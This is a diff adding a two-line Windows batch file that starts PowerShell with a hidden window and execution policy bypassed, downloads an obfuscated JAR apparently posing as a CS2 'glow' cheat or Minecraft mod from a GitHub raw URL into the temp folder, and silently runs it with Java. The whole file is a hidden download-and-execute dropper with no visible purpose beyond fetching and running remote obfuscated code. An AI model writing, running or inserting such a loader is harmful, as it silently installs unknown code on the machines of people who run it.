@@ -1,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/CS2Glow_obf.jar' -OutFile '%TEMP%\CS2Glow_obf.jar' -UseBasicParsing; Start-Process -FilePath 'java' -ArgumentList '-jar','%TEMP%\CS2Glow_obf.jar' -WindowStyle Hidden"
